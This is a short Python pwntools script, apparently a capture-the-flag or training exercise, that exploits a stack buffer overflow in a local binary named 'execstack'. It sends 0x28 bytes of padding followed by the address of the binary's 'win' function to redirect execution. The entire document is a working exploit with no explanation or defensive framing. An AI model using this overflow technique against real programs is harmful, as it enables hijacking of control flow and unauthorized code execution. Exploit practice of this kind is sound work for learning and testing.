#!/usr/bin/python3
 
from pwn import *

vuln = ELF("./execstack")

p = process("./execstack")

p.recvline()

#pause()
#payload = cyclic(0x40)
payload = 0x28 *b"A" + p64(vuln.symbols["win"])
p.sendline(payload)

print(p.recvall())